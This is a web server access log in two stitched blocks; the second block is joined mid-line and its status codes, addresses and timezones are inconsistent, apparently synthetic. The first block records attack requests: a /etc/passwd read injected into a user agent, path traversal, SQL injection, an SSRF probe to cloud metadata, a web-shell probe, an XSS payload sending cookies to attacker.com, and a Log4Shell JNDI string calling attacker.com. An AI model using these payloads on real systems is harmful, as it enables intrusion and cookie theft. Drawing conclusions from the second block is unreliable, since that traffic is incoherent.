193.56.28.14 - - [02/Sep/2026:14:35:01 -0300] "GET /wp-config.php.bak HTTP/1.1" 404 208 "-" "Go-http-client/1.1"
185.191.171.12 - - [02/Sep/2026:14:35:03 -0300] "POST /cgi-bin/vulnerable.cgi HTTP/1.1" 500 412 "-" "curl/7.68.0; echo; /bin/cat /etc/passwd"
201.86.12.90 - - [02/Sep/2026:14:35:05 -0300] "GET /api/v2/user/profile HTTP/1.1" 200 842 "https://app.meusite.com" "okhttp/4.9.0"
103.152.220.8 - - [02/Sep/2026:14:35:06 -0300] "POST /api/v1/auth/login HTTP/1.1" 401 320 "https://meusite.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
45.146.164.110 - - [02/Sep/2026:14:35:08 -0300] "GET /index.php?page=../../../../proc/self/environ%00 HTTP/1.1" 400 512 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
66.249.66.1 - - [02/Sep/2026:14:35:10 -0300] "GET /robots.txt HTTP/1.1" 200 112 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
194.26.29.114 - - [02/Sep/2026:14:35:12 -0300] "GET /products HTTP/1.1" 500 1450 "https://meusite.com" "Mozilla/5.0 (SQLi Scanner v2.0; '; DROP TABLE users;--)"
185.220.101.40 - - [02/Sep/2026:14:35:15 -0300] "GET /webhook?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 403 310 "-" "python-requests/2.28.1"
177.135.40.22 - - [02/Sep/2026:14:35:18 -0300] "GET /static/css/main.a4b2c1.css HTTP/1.1" 304 0 "https://meusite.com/dashboard" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
162.158.12.88 - - [02/Sep/2026:14:35:20 -0300] "GET /c99.php HTTP/1.1" 404 208 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64)"
189.120.45.3 - - [02/Sep/2026:14:35:22 -0300] "GET /catalog/search?q=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fattacker.com%2Fsteal%3Fcookie%3D%27%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1" 200 4520 "https://meusite.com/catalog" "Mozilla/5.0"
179.180.22.50 - - [02/Sep/2026:14:35:25 -0300] "PUT /api/v1/user/email HTTP/1.1" 200 150 "https://malicious-site.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
198.51.100.99 - - [02/Sep/2026:14:35:26 -0300] "GET /checkout HTTP/1.1" 429 180 "https://meusite.com/cart" "ApacheBench/2.3"
45.83.64.2 - - [02/Sep/2026:14:35:28 -0300] "GET / HTTP/1.1" 400 250 "-" "${jndi:ldap://attacker.com/a}"
200.201.202.203 - - [02/Sep/2026:14:35:30 -0300] "GET /contact HTTP/1.1" 200 3210 "https://meusite.com/about" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X)"192.168.1.50 - - [04/Sep/2026:11:47:18 ] "PUT /assets/style.css HTTP/1.1" 401 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
10.0.0.12 - - [04/Sep/2026:11:47:20 ] "GET /assets/style.css HTTP/1.1" 201 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
10.0.0.12 - - [04/Sep/2026:11:47:22 ] "GET /api/v1/users HTTP/1.1" 201 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
200.150.45.22 - - [04/Sep/2026:11:47:24 ] "GET /assets/style.css HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
10.0.0.12 - - [04/Sep/2026:11:47:26 ] "POST /api/v1/users HTTP/1.1" 401 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
200.150.45.22 - - [04/Sep/2026:11:47:28 ] "PUT /assets/style.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
192.168.1.50 - - [04/Sep/2026:11:47:30 ] "POST /assets/style.css HTTP/1.1" 500 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
8.8.8.8 - - [04/Sep/2026:11:47:32 ] "DELETE /images/logo.png HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
192.168.1.50 - - [04/Sep/2026:11:47:34 ] "POST /login HTTP/1.1" 200 2716 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
8.8.8.8 - - [04/Sep/2026:11:47:36 ] "POST /api/v1/users HTTP/1.1" 500 0 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
192.168.1.50 - - [04/Sep/2026:11:47:38 ] "PUT /favicon.ico HTTP/1.1" 200 668 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
8.8.8.8 - - [04/Sep/2026:11:47:40 ] "POST /favicon.ico HTTP/1.1" 500 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
172.16.254.1 - - [04/Sep/2026:11:47:42 ] "POST /api/v1/users HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
192.168.1.50 - - [04/Sep/2026:11:47:44 ] "GET /assets/style.css HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
10.0.0.12 - - [04/Sep/2026:11:47:46 ] "PUT /assets/style.css HTTP/1.1" 500 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
200.150.45.22 - - [04/Sep/2026:11:47:48 ] "DELETE /assets/style.css HTTP/1.1" 401 0 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
10.0.0.12 - - [04/Sep/2026:11:47:50 ] "GET /api/v1/users HTTP/1.1" 201 0 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
8.8.8.8 - - [04/Sep/2026:11:47:52 ] "DELETE /favicon.ico HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.168.1.50 - - [04/Sep/2026:11:47:54 ] "DELETE /assets/style.css HTTP/1.1" 500 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.168.1.50 - - [04/Sep/2026:11:47:56 ] "GET /login HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
200.150.45.22 - - [04/Sep/2026:11:47:58 ] "GET /favicon.ico HTTP/1.1" 201 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
10.0.0.12 - - [04/Sep/2026:11:48:00 ] "PUT /api/v1/users HTTP/1.1" 500 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
200.150.45.22 - - [04/Sep/2026:11:48:02 ] "GET /index.html HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
200.150.45.22 - - [04/Sep/2026:11:48:04 ] "GET /images/logo.png HTTP/1.1" 500 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
200.150.45.22 - - [04/Sep/2026:11:48:06 ] "GET /api/v1/users HTTP/1.1" 401 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
200.150.45.22 - - [04/Sep/2026:11:48:08 ] "GET /favicon.ico HTTP/1.1" 201 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
172.16.254.1 - - [04/Sep/2026:11:48:10 ] "POST /api/v1/users HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
8.8.8.8 - - [04/Sep/2026:11:48:12 ] "GET /favicon.ico HTTP/1.1" 500 0 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
10.0.0.12 - - [04/Sep/2026:11:48:14 ] "POST /login HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
200.150.45.22 - - [04/Sep/2026:11:48:16 ] "POST /images/logo.png HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
8.8.8.8 - - [04/Sep/2026:11:48:18 ] "DELETE /images/logo.png HTTP/1.1" 201 0 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
200.150.45.22 - - [04/Sep/2026:11:48:20 ] "DELETE /index.html HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.168.1.50 - - [04/Sep/2026:11:48:22 ] "PUT /images/logo.png HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
172.16.254.1 - - [04/Sep/2026:11:48:24 ] "PUT /images/logo.png HTTP/1.1" 500 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
